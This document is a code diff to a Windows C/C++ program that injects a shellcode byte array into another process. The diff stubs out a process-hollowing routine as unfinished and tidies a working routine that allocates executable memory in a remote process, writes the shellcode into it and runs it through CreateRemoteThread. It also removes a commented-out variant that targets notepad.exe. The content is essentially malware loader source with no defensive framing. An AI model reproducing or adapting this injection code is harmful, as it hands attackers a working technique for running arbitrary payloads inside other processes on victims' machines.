@@ -63,10 +63,12 @@ unsigned char shellcode[] =
 "\xb7\x28\x9f\x7a\xf9\xeb\x52\xab\xcb\x3d\xab\x9d\x1b\x6f\xf9"
 "\xd8\x5b\x76\x86\xe0\xb1";
 
-
-
 BOOL InjectShellcodeByHollowing(PROCESS_INFORMATION processInfo)
 {
+
+	_tprintf(TEXT("This is still a WIP"));
+	return FALSE;
+
 	HMODULE hNTDLL = LoadLibraryA("ntdll");
 	if (!hNTDLL)
 	{
@@ -96,7 +98,7 @@ BOOL InjectShellcodeByHollowing(PROCESS_INFORMATION processInfo)
 	_tprintf(TEXT("Attach debugger..."));
 	getchar();
 #endif
-	PVOID pRemoteImage = VirtualAllocEx (processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress,	sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,	PAGE_EXECUTE_READWRITE);
+	PVOID pRemoteImage = VirtualAllocEx (processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (!pRemoteImage)
 	{
@@ -104,7 +106,7 @@ BOOL InjectShellcodeByHollowing(PROCESS_INFORMATION processInfo)
 		return FALSE;
 	}
 
-	if (!WriteProcessMemory(processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, shellcode, 	sizeof(shellcode), 	nullptr	))
+	if (!WriteProcessMemory(processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, shellcode, sizeof(shellcode), nullptr))
 	{
 		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
 		return FALSE;
@@ -121,103 +123,24 @@ BOOL InjectShellcodeIntoNewThread(PROCESS_INFORMATION processInfo)
 	getchar();
 #endif
 
-	PVOID mem = VirtualAllocEx(processInfo.hProcess, nullptr,	sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	const PVOID memoryAddress = VirtualAllocEx(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	if (!mem)
+	if (!memoryAddress)
 	{
 		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
 		return FALSE;
 	}
 
-	if (!WriteProcessMemory(processInfo.hProcess, mem, shellcode, sizeof(shellcode), nullptr))
+	if (!WriteProcessMemory(processInfo.hProcess, memoryAddress, shellcode, sizeof(shellcode), nullptr))
 	{
 		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
 		return FALSE;
 	}
 
-	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
+	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memoryAddress, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
 	{
 		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
 		return FALSE;
 	}
 	return TRUE;
 }
-
-/*HMODULE GetRemoteModuleHandle(DWORD lpProcessId, LPCSTR lpModule)
-{
-	HMODULE hResult = NULL;
-	HANDLE hSnapshot;
-	MODULEENTRY32 me32;
-
-	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lpProcessId);
-	if (hSnapshot != INVALID_HANDLE_VALUE)
-	{
-		me32.dwSize = sizeof(MODULEENTRY32);
-		if (Module32First(hSnapshot, &me32))
-		{
-			do
-			{
-				char * szModule;
-				wcstombs(szModule, me32.szModule, sizeof(me32.szModule));
-				if (!stricmp(szModule, lpModule))
-				{
-					hResult = me32.hModule;
-					break;
-				}
-			} while (Module32Next(hSnapshot, &me32));
-		}
-		CloseHandle(hSnapshot);
-	}
-	return hResult;
-}
-
-BOOL InjectShellcode(PROCESS_INFORMATION processInfo)
-{
-	MODULEINFO moduleInfo;
-	//if (!GetModuleInformation(processInfo.hProcess, NULL, moduleInfo, sizeof(moduleInfo)))
-	//{
-	//	DisplayErrorMessage(TEXT("Error querying process information"), GetLastError());
-	//	return FALSE;
-	//}
-	HMODULE hModule = GetRemoteModuleHandle(processInfo.dwProcessId, "notepad.exe");
-	GetModuleInformation(processInfo.hProcess, hModule, &moduleInfo, sizeof(moduleInfo));
-
-	/*	if (!ntQueryInformationProcess(processInfo.hProcess, 0, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength))
-		{
-			DisplayErrorMessage(TEXT("Error querying process information"), GetLastError());
-			getchar();
-			return FALSE;
-		}
-		* /
-	_tprintf(TEXT("Attach debugger..."));
-	getchar();
-	PVOID pRemoteImage = VirtualAllocEx
-	(
-		processInfo.hProcess,
-		moduleInfo.EntryPoint,
-		sizeof(shellcode),
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE
-	);
-
-	if (!pRemoteImage)
-	{
-		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
-		return FALSE;
-	}
-
-	if (!WriteProcessMemory
-	(
-		processInfo.hProcess,
-		moduleInfo.EntryPoint,
-		shellcode,
-		sizeof(shellcode),
-		0
-	))
-	{
-		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
-		return FALSE;
-	}
-
-	return TRUE;
-}*/
